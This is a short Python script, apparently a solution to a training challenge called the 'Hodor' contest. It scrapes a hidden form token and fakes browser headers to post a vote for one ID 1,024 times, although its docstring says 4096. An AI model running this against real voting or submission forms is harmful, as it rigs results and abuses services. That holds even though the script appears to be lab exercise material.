#!/usr/bin/python3
""" Voting 4096 times in Hodor contest """
import requests
from bs4 import BeautifulSoup


ID = 3393
url = "http://158.69.76.135/level2.php"
directory = {
    'id': ID,
    'holdthedoor': 'Submit',
    'key': ''
}
User_Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
If_none_match = "oun53Fx3Gv2rMXFKHCOgbD2hEes="
header = {
    'User-Agent': User_Agent,
    'If-None-Match': If_none_match,
    'referer': url
}
if __name__ == '__main__':

    for i in range(1024):
        session = requests.Session()
        response = session.get(url, headers=header)
        soup = BeautifulSoup(response.text, "html.parser")
        form = soup.form
        input = form.find("input", {"name": "key"})
        key = input["value"]
        directory['key'] = key
        session.post(url, headers=header, data=directory)
